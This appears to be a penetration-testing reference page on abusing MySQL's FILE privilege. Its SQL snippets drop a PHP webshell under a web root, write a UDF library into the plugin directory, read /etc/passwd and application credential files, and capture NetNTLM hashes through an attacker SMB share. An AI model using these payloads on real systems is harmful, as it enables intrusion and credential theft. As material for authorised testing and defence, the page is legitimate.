---
title: "MySQL file access: INTO OUTFILE and LOAD_FILE"
description: "Writing files on the MySQL or MariaDB host with SELECT ... INTO OUTFILE to drop a webshell, and reading host files with LOAD_FILE, both gated by the FILE privilege and the secure_file_priv setting."
keywords:
  - INTO OUTFILE
  - LOAD_FILE
  - FILE privilege
  - secure_file_priv
  - webshell
---

# File access

With the **`FILE`** privilege, MySQL reads and writes files as its service account. The write primitive is the more valuable: dropping a webshell under a web root is a direct path to code execution, and writing a library into the plugin directory sets up a [UDF](command-execution.md).

## Writing files

```sql
-- drop a webshell under a served directory
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
-- write raw bytes (e.g. a UDF .so) with DUMPFILE, which does not add row/line formatting
SELECT 0xMACHINECODE INTO DUMPFILE '/usr/lib/mysql/plugin/x.so';
```

## Reading files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');   -- app secrets, DB creds
```

## The secure_file_priv gate

```sql
SELECT @@secure_file_priv;
-- '' (empty)  -> read/write anywhere
-- a directory -> confined to that path
-- NULL        -> file operations disabled
```

## Exploitation notes

- The webshell write is the headline: `INTO OUTFILE` under the web root turns database access into web RCE, provided the path is writable by the `mysql` account and `secure_file_priv` allows it.
- Use **`INTO DUMPFILE`** (not `OUTFILE`) for binaries: `OUTFILE` escapes and adds separators, corrupting a `.so`/`.dll`; `DUMPFILE` writes bytes verbatim.
- `LOAD_FILE` returns NULL when the file is unreadable by the service account or blocked by `secure_file_priv`, so check that setting first.
- These require the `FILE` privilege, which `root` has by default; a lower user may not, so confirm with `SHOW GRANTS`.
- On **Windows** MySQL, `LOAD_FILE('\\\\<attacker>\\x')` makes the service account authenticate to an SMB listener, a NetNTLM [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) or [relay](../../directory/active-directory/authentication/ntlm/relay.md) primitive; uncommon, since MySQL on Windows is rare.

## Tools

- **mysql**: run `INTO OUTFILE` / `LOAD_FILE` directly.
- **sqlmap** (`--file-write`, `--file-read`): automated file write and read over injection or a direct connection.

## References

- [MySQL: SELECT ... INTO statement](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [HackTricks: MySQL file read and write](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
